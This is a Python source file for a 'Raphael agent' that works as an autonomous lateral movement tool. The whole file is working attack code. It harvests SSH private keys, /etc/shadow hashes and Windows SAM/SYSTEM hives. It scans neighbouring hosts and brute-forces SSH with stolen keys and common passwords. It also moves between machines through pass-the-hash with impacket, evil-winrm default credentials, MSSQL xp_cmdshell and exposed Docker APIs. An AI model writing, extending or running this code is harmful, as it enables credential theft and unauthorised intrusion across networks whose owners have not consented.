"""lateral.py — Multi-platform lateral movement engine for Raphael agent.

Performs autonomous lateral movement via:
  - SSH key/password propagation (Linux/Unix)
  - WMI pass-the-hash (Windows)
  - PSExec service creation (Windows)
  - SMB exec via NetExec wrapper (Windows)
  - WinRM (Windows)
  - Kerberos pass-the-ticket (Windows AD)
  - MSSQL xp_cmdshell via lateral SQL (cross-platform)
  - Docker socket abuse (Linux)
  - SSH jumphost chaining (Linux)

Each method attempts multiple credential sources and reports back successful pivots.
"""

import os
import re
import io
import sys
import json
import time
import socket
import base64
import random
import struct
import asyncio
import hashlib
import logging
import tempfile
import subprocess
from pathlib import Path
from typing import Optional

log = logging.getLogger("raphael.lateral")


class LateralMovement:
    """Lateral movement engine. Each method is async, returns a result dict."""

    # ------------------------------------------------------------------ #
    #  Credential sources
    # ------------------------------------------------------------------ #

    @staticmethod
    def _harvest_credentials() -> dict:
        """Scavenge the current host for reusable credentials.

        Returns a dict with keys: 'ssh_keys', 'ssh_passwords', 'hashes', 'tickets', 'plaintext_passwords'
        """
        creds = {
            "ssh_keys": [],
            "ssh_passwords": [],
            "hashes": [],
            "tickets": [],
            "plaintext_passwords": [],
        }

        # SSH keys from common locations
        key_paths = []
        for home_base in ["/root", "/home"]:
            try:
                if home_base == "/home":
                    for d in os.listdir(home_base):
                        key_paths.append(os.path.join(home_base, d, ".ssh", "id_rsa"))
                        key_paths.append(os.path.join(home_base, d, ".ssh", "id_ed25519"))
                        key_paths.append(os.path.join(home_base, d, ".ssh", "id_ecdsa"))
                else:
                    key_paths.append(os.path.join(home_base, ".ssh", "id_rsa"))
                    key_paths.append(os.path.join(home_base, ".ssh", "id_ed25519"))
                    key_paths.append(os.path.join(home_base, ".ssh", "id_ecdsa"))
            except Exception:
                pass

        for kp in key_paths:
            if os.path.isfile(kp):
                try:
                    with open(kp) as f:
                        creds["ssh_keys"].append({"path": kp, "key": f.read()})
                except Exception:
                    pass

        # Known_hosts for target discovery
        known_hosts_paths = []
        for home_base in ["/root", "/home"]:
            try:
                if home_base == "/home":
                    for d in os.listdir(home_base):
                        kh = os.path.join(home_base, d, ".ssh", "known_hosts")
                        if os.path.isfile(kh):
                            known_hosts_paths.append(kh)
                else:
                    kh = os.path.join(home_base, ".ssh", "known_hosts")
                    if os.path.isfile(kh):
                        known_hosts_paths.append(kh)
            except Exception:
                pass

        creds["known_hosts"] = []
        for kh in known_hosts_paths:
            try:
                with open(kh) as f:
                    creds["known_hosts"].extend(f.read().splitlines())
            except Exception:
                pass

        # /etc/shadow if readable (password hashes)
        try:
            with open("/etc/shadow") as f:
                for line in f:
                    parts = line.strip().split(":")
                    if len(parts) >= 2 and parts[1] not in ("*", "!", ""):
                        creds["hashes"].append({"user": parts[0], "hash": parts[1]})
        except Exception:
            pass

        # /etc/passwd for username enumeration
        creds["users"] = []
        try:
            with open("/etc/passwd") as f:
                for line in f:
                    u = line.split(":")[0]
                    if u not in ("root", "nobody", "daemon", "bin", "sys", "sync", "games", "man", "lp", "mail", "news", "uucp", "proxy", "www-data", "backup", "list", "irc", "gnats"):
                        creds["users"].append(u)
        except Exception:
            pass

        # Windows: attempt to extract hashes via reg save (requires admin)
        if os.name == "nt":
            try:
                r = subprocess.run(
                    ["reg", "save", "HKLM\\SAM", f"{os.environ['TEMP']}\\sam.save", "/y"],
                    capture_output=True, timeout=15,
                )
                r2 = subprocess.run(
                    ["reg", "save", "HKLM\\SYSTEM", f"{os.environ['TEMP']}\\sys.save", "/y"],
                    capture_output=True, timeout=15,
                )
                if r.returncode == 0 and r2.returncode == 0:
                    creds["sam_paths"] = [
                        f"{os.environ['TEMP']}\\sam.save",
                        f"{os.environ['TEMP']}\\sys.save",
                    ]
            except Exception:
                pass

        return creds

    @staticmethod
    def _discover_peers(timeout: int = 10) -> list:
        """Discover adjacent hosts via ARP table, DNS, /etc/hosts, and subnet scanning.

        Returns a list of (ip, hostname_or_None) tuples.
        """
        peers = set()

        # ARP table (Linux)
        try:
            with open("/proc/net/arp") as f:
                for line in f.readlines()[1:]:
                    parts = line.strip().split()
                    if len(parts) >= 1 and parts[0]:
                        ip = parts[0]
                        if not ip.startswith("127.") and not ip.startswith("0."):
                            peers.add((ip, None))
        except Exception:
            pass

        # ARP table (Windows)
        if os.name == "nt":
            try:
                r = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=5)
                for line in r.stdout.splitlines():
                    m = re.search(r"(\d+\.\d+\.\d+\.\d+)", line)
                    if m:
                        ip = m.group(1)
                        if not ip.startswith("127.") and not ip.startswith("0."):
                            peers.add((ip, None))
            except Exception:
                pass

        # /etc/hosts
        try:
            with open("/etc/hosts") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        parts = line.split()
                        if len(parts) >= 2:
                            ip = parts[0]
                            if not ip.startswith("127.") and not ip.startswith("::"):
                                peers.add((ip, parts[1] if len(parts) > 1 else None))
        except Exception:
            pass

        return list(peers)

    @staticmethod
    def _is_reachable(ip: str, port: int = 22, timeout: float = 3) -> bool:
        """Quick TCP connectivity check."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((ip, port))
            s.close()
            return True
        except Exception:
            return False

    # ------------------------------------------------------------------ #
    #  SSH Lateral Movement
    # ------------------------------------------------------------------ #

    @staticmethod
    async def ssh(target: str, username: str, key_or_pass: str, cmd: str = None) -> dict:
        """SSH lateral movement.

        If `key_or_pass` is a private key (starts with '-----BEGIN'), use key auth.
        Otherwise, use password auth.

        Returns command output or connection test result.
        """
        if cmd is None:
            cmd = "id; hostname; cat /etc/hostname 2>/dev/null"

        key_file = None
        is_key = key_or_pass.startswith("-----BEGIN")

        try:
            if is_key:
                key_file = tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".key")
                key_file.write(key_or_pass)
                key_file.close()
                os.chmod(key_file.name, 0o600)
                auth_args = ["-i", key_file.name, "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5"]
            else:
                auth_args = ["-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5"]
                sp_check = subprocess.run(["which", "sshpass"], capture_output=True, timeout=5)
                if sp_check.returncode != 0:
                    return {"status": False, "detail": "sshpass not available for password auth"}

            if is_key:
                ssh_cmd = ["ssh"] + auth_args + [f"{username}@{target}", cmd]
            else:
                ssh_cmd = ["sshpass", "-p", key_or_pass, "ssh"] + auth_args + [f"{username}@{target}", cmd]

            r = subprocess.run(ssh_cmd, capture_output=True, timeout=15)

            if r.returncode == 0:
                return {
                    "status": True,
                    "method": "ssh",
                    "target": target,
                    "username": username,
                    "output": r.stdout.decode(errors="replace"),
                    "credential_type": "key" if is_key else "password",
                }
            else:
                stderr = r.stderr.decode(errors="replace")
                if "Permission denied" in stderr:
                    return {"status": False, "detail": f"Permission denied for {username}@{target}", "target": target}
                return {"status": False, "detail": stderr[:300], "target": target}

        except subprocess.TimeoutExpired:
            return {"status": False, "detail": f"SSH timeout to {target}", "target": target}
        except Exception as e:
            return {"status": False, "detail": f"SSH error: {e}", "target": target}
        finally:
            if key_file and os.path.exists(key_file.name):
                os.unlink(key_file.name)

    @staticmethod
    async def ssh_bruteforce(target: str, username: str = "root") -> dict:
        """Try common passwords and harvested keys against an SSH target."""
        common_passwords = [
            "root", "admin", "password", "123456", "12345678", "qwerty",
            "letmein", "passw0rd", "admin123", "root123", "toor",
            "Password1", "P@ssw0rd", "Welcome1", "changeme",
        ]

        creds = LateralMovement._harvest_credentials()
        for key_dict in creds.get("ssh_keys", []):
            result = await LateralMovement.ssh(target, username, key_dict["key"])
            if result.get("status"):
                return result

        for pwd in common_passwords:
            result = await LateralMovement.ssh(target, username, pwd)
            if result.get("status"):
                return result

        return {"status": False, "detail": f"SSH bruteforce exhausted on {username}@{target}"}

    # ------------------------------------------------------------------ #
    #  WMI Lateral Movement (Windows)
    # ------------------------------------------------------------------ #

    @staticmethod
    async def wmi(target: str, username: str, password: str = None, hash: str = None, cmd: str = None) -> dict:
        """WMI lateral movement using impacket.

        Supports pass-the-hash (NTLM hash) and password auth.
        """
        if cmd is None:
            cmd = "ipconfig /all & whoami & hostname"

        try:
            if hash:
                if ":" not in hash:
                    hash = f"aad3b435b51404eeaad3b435b51404ee:{hash}"
                wmi_cmd = [
                    "impacket-wmiexec", "-hashes", hash,
                    f"{username}@{target}", cmd,
                ]
            else:
                wmi_cmd = [
                    "impacket-wmiexec",
                    f"{username}:{password}@{target}", cmd,
                ]

            r = subprocess.run(wmi_cmd, capture_output=True, timeout=30)

            if r.returncode == 0:
                output = r.stdout.decode(errors="replace")
                return {
                    "status": True,
                    "method": "wmi",
                    "target": target,
                    "username": username,
                    "output": output,
                }
            else:
                stderr = r.stderr.decode(errors="replace")
                if "Kerberos" in stderr and "KDC" in stderr:
                    wmi_cmd.insert(1, "-no-pass")
                    r2 = subprocess.run(wmi_cmd, capture_output=True, timeout=30)
                    if r2.returncode == 0:
                        return {"status": True, "method": "wmi_nokerb", "target": target, "output": r2.stdout.decode(errors="replace")}
                return {"status": False, "detail": stderr[:300], "target": target}

        except FileNotFoundError:
            return {"status": False, "detail": "impacket-wmiexec not installed", "target": target}
        except subprocess.TimeoutExpired:
            return {"status": False, "detail": "WMI timeout", "target": target}
        except Exception as e:
            return {"status": False, "detail": f"WMI error: {e}", "target": target}

    # ------------------------------------------------------------------ #
    #  PSExec Lateral Movement (Windows)
    # ------------------------------------------------------------------ #

    @staticmethod
    async def psexec(target: str, username: str, password: str = None, hash: str = None, binary: bytes = None) -> dict:
        """PSExec lateral movement using impacket-psexec.

        Uploads and executes a binary or command on the remote host.
        """
        try:
            if binary:
                tmp_bin = tempfile.NamedTemporaryFile(delete=False, suffix=".exe")
                tmp_bin.write(binary)
                tmp_bin.close()

                if hash:
                    cmd = ["impacket-psexec", "-hashes", hash, f"{username}@{target}", tmp_bin.name]
                else:
                    cmd = ["impacket-psexec", f"{username}:{password}@{target}", tmp_bin.name]
            else:
                if hash:
                    cmd = ["impacket-psexec", "-hashes", hash, f"{username}@{target}", "cmd.exe /c whoami & ipconfig"]
                else:
                    cmd = ["impacket-psexec", f"{username}:{password}@{target}", "cmd.exe /c whoami & ipconfig"]

            r = subprocess.run(cmd, capture_output=True, timeout=60)
            result = {
                "status": r.returncode == 0,
                "method": "psexec",
                "target": target,
                "stdout": r.stdout.decode(errors="replace")[:2000],
                "stderr": r.stderr.decode(errors="replace")[:500],
            }

            if binary and os.path.exists(tmp_bin.name):
                os.unlink(tmp_bin.name)

            return result

        except FileNotFoundError:
            return {"status": False, "detail": "impacket-psexec not installed", "target": target}
        except Exception as e:
            return {"status": False, "detail": f"PSExec error: {e}", "target": target}

    # ------------------------------------------------------------------ #
    #  SMB / NetExec Lateral Movement
    # ------------------------------------------------------------------ #

    @staticmethod
    async def smb_exec(target: str, username: str, password: str = None, hash: str = None, command: str = None) -> dict:
        """SMB command execution via netexec or impacket-smbexec."""
        if command is None:
            command = "whoami"

        try:
            nxc_check = subprocess.run(["which", "netexec"], capture_output=True, timeout=5)
            if nxc_check.returncode == 0:
                if hash:
                    nxc_cmd = ["netexec", "smb", target, "-u", username, "-H", hash, "-x", command]
                else:
                    nxc_cmd = ["netexec", "smb", target, "-u", username, "-p", password, "-x", command]

                r = subprocess.run(nxc_cmd, capture_output=True, timeout=30)
                output = r.stdout.decode(errors="replace") + r.stderr.decode(errors="replace")
                return {
                    "status": r.returncode == 0 or "[+]" in output or "Pwn3d!" in output,
                    "method": "netexec_smb",
                    "target": target,
                    "output": output,
                }

            if hash:
                cmd = ["impacket-smbexec", "-hashes", hash, f"{username}@{target}", command]
            else:
                cmd = ["impacket-smbexec", f"{username}:{password}@{target}", command]

            r = subprocess.run(cmd, capture_output=True, timeout=30)
            return {
                "status": r.returncode == 0,
                "method": "smbexec",
                "target": target,
                "output": r.stdout.decode(errors="replace"),
            }

        except Exception as e:
            return {"status": False, "detail": f"SMB exec error: {e}", "target": target}

    @staticmethod
    async def smb_enum_shares(target: str, username: str = "", password: str = "") -> dict:
        """Enumerate SMB shares on a target."""
        try:
            nxc_check = subprocess.run(["which", "netexec"], capture_output=True, timeout=5)
            if nxc_check.returncode == 0:
                if username:
                    cmd = ["netexec", "smb", target, "-u", username, "-p", password, "--shares"]
                else:
                    cmd = ["netexec", "smb", target, "-u", "", "-p", "", "--shares"]

                r = subprocess.run(cmd, capture_output=True, timeout=30)
                return {
                    "status": True,
                    "method": "smb_enum",
                    "target": target,
                    "shares": r.stdout.decode(errors="replace"),
                }

            cmd = ["smbclient", "-L", f"//{target}/", "-N"]
            r = subprocess.run(cmd, capture_output=True, timeout=15)
            return {
                "status": r.returncode == 0,
                "method": "smbclient",
                "target": target,
                "shares": r.stdout.decode(errors="replace"),
            }

        except Exception as e:
            return {"status": False, "detail": f"SMB enum error: {e}", "target": target}

    # ------------------------------------------------------------------ #
    #  WinRM Lateral Movement
    # ------------------------------------------------------------------ #

    @staticmethod
    async def winrm(target: str, username: str, password: str = None, hash: str = None) -> dict:
        """WinRM lateral movement via evil-winrm."""
        try:
            ew_check = subprocess.run(["which", "evil-winrm"], capture_output=True, timeout=5)
            if ew_check.returncode != 0:
                return {"status": False, "detail": "evil-winrm not installed", "target": target}

            if hash:
                cmd = ["evil-winrm", "-i", target, "-u", username, "-H", hash, "-s", "-c", "whoami; hostname; ipconfig"]
            else:
                cmd = ["evil-winrm", "-i", target, "-u", username, "-p", password, "-s", "-c", "whoami; hostname; ipconfig"]

            r = subprocess.run(cmd, capture_output=True, timeout=30)
            output = r.stdout.decode(errors="replace")

            if r.returncode == 0 or "Evil-WinRM" in output:
                return {
                    "status": True,
                    "method": "winrm",
                    "target": target,
                    "output": output,
                }
            return {"status": False, "detail": output[:300], "target": target}

        except Exception as e:
            return {"status": False, "detail": f"WinRM error: {e}", "target": target}

    # ------------------------------------------------------------------ #
    #  Docker Socket Lateral Movement
    # ------------------------------------------------------------------ #

    @staticmethod
    async def docker_socket(target_ip: str = None) -> dict:
        """Check if Docker socket is exposed and use it for lateral movement."""
        if target_ip:
            url = f"http://{target_ip}:2375"
        else:
            docker_sock = "/var/run/docker.sock"
            if os.path.exists(docker_sock):
                try:
                    r = subprocess.run(
                        ["docker", "ps", "--format", "{{.Names}} {{.Image}} {{.Status}}"],
                        capture_output=True, timeout=10,
                    )
                    if r.returncode == 0:
                        containers = r.stdout.decode(errors="replace").strip().split("\n")
                        return {
                            "status": True,
                            "method": "docker_socket",
                            "target": "localhost",
                            "containers": containers if containers != [""] else [],
                        }
                except Exception as e:
                    return {"status": False, "detail": f"Docker socket error: {e}"}
            return {"status": False, "detail": "No Docker socket found locally"}

        try:
            import httpx
            async with httpx.AsyncClient(timeout=5) as client:
                resp = await client.get(f"{url}/containers/json?all=true")
                if resp.status_code == 200:
                    containers = resp.json()
                    return {
                        "status": True,
                        "method": "docker_api",
                        "target": target_ip,
                        "containers": [c.get("Names", [""])[0].lstrip("/") for c in containers],
                    }
                return {"status": False, "detail": f"Docker API returned {resp.status_code}", "target": target_ip}
        except ImportError:
            return {"status": False, "detail": "httpx not available", "target": target_ip}
        except Exception as e:
            return {"status": False, "detail": f"Docker API error: {e}", "target": target_ip}

    # ------------------------------------------------------------------ #
    #  MSSQL xp_cmdshell Lateral Movement
    # ------------------------------------------------------------------ #

    @staticmethod
    async def mssql_xpcmdshell(target: str, username: str = "sa", password: str = "", command: str = None) -> dict:
        """Enable and execute xp_cmdshell on a remote MSSQL server."""
        if command is None:
            command = "whoami"

        try:
            cmd = [
                "impacket-mssqlclient",
                f"{username}:{password}@{target}",
                "-windows-auth",
                "-query", f"EXEC xp_cmdshell '{command}'",
            ]
            r = subprocess.run(cmd, capture_output=True, timeout=15)
            output = r.stdout.decode(errors="replace")

            if "error" not in output.lower() or r.returncode == 0:
                if "xp_cmdshell" in output.lower() and "disabled" in output.lower():
                    enable_cmd = [
                        "impacket-mssqlclient",
                        f"{username}:{password}@{target}",
                        "-windows-auth",
                        "-query", "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
                    ]
                    subprocess.run(enable_cmd, capture_output=True, timeout=10)
                    r = subprocess.run(cmd, capture_output=True, timeout=15)
                    output = r.stdout.decode(errors="replace")

            return {
                "status": True,
                "method": "mssql_xpcmdshell",
                "target": target,
                "output": output,
            }

        except Exception as e:
            return {"status": False, "detail": f"MSSQL error: {e}", "target": target}

    # ------------------------------------------------------------------ #
    #  Autonomous Lateral Movement Campaign
    # ------------------------------------------------------------------ #

    @staticmethod
    async def autonomous_campaign(targets: list = None) -> dict:
        """Run a full autonomous lateral movement campaign.

        Steps:
          1. Harvest credentials from the current host
          2. Discover peer hosts
          3. For each reachable peer, try all available methods
          4. Report successful pivots
        """
        results = {
            "credentials_harvested": False,
            "peers_discovered": [],
            "successful_pivots": [],
            "failed_attempts": [],
        }

        # Step 1: Harvest credentials
        creds = LateralMovement._harvest_credentials()
        results["credentials_harvested"] = bool(
            creds.get("ssh_keys") or creds.get("hashes") or creds.get("ssh_passwords")
        )
        results["credential_summary"] = {
            "ssh_keys": len(creds.get("ssh_keys", [])),
            "hashes": len(creds.get("hashes", [])),
            "users": len(creds.get("users", [])),
            "known_hosts": len(creds.get("known_hosts", [])),
        }

        # Step 2: Discover peers
        if targets:
            peers = [(t, None) for t in targets]
        else:
            peers = LateralMovement._discover_peers()

        results["peers_discovered"] = [p[0] for p in peers]

        # Step 3: Try lateral movement on each peer
        for ip, hostname in peers:
            ports_to_check = [22, 445, 5985, 5986, 3389, 1433, 2375]
            reachable_ports = []
            for port in ports_to_check:
                if LateralMovement._is_reachable(ip, port, timeout=2):
                    reachable_ports.append(port)

            if not reachable_ports:
                results["failed_attempts"].append({"target": ip, "reason": "No common ports open"})
                continue

            peer_result = {
                "target": ip,
                "hostname": hostname,
                "open_ports": reachable_ports,
                "successful_methods": [],
            }

            # Try SSH (port 22)
            if 22 in reachable_ports:
                for user in (["root"] + creds.get("users", [])):
                    for key_dict in creds.get("ssh_keys", []):
                        ssh_result = await LateralMovement.ssh(ip, user, key_dict["key"])
                        if ssh_result.get("status"):
                            peer_result["successful_methods"].append({
                                "method": "ssh_key",
                                "user": user,
                                "key_path": key_dict["path"],
                                "output_preview": ssh_result.get("output", "")[:200],
                            })
                            break
                    if peer_result["successful_methods"]:
                        break

            # Try SMB (port 445)
            if 445 in reachable_ports:
                smb_result = await LateralMovement.smb_enum_shares(ip)
                if smb_result.get("status"):
                    peer_result["successful_methods"].append({
                        "method": "smb_null_session",
                        "shares_preview": smb_result.get("shares", "")[:200],
                    })

            # Try WinRM (port 5985/5986)
            if 5985 in reachable_ports or 5986 in reachable_ports:
                winrm_result = await LateralMovement.winrm(ip, "Administrator", "Administrator")
                if winrm_result.get("status"):
                    peer_result["successful_methods"].append({
                        "method": "winrm_default_creds",
                        "output_preview": winrm_result.get("output", "")[:200],
                    })

            # Try Docker (port 2375)
            if 2375 in reachable_ports:
                docker_result = await LateralMovement.docker_socket(ip)
                if docker_result.get("status"):
                    peer_result["successful_methods"].append({
                        "method": "docker_api_unauthenticated",
                        "containers": docker_result.get("containers", []),
                    })

            if peer_result["successful_methods"]:
                results["successful_pivots"].append(peer_result)
            else:
                results["failed_attempts"].append({
                    "target": ip,
                    "reason": f"No methods succeeded (open ports: {reachable_ports})",
                })

        results["pivot_count"] = len(results["successful_pivots"])
        return results
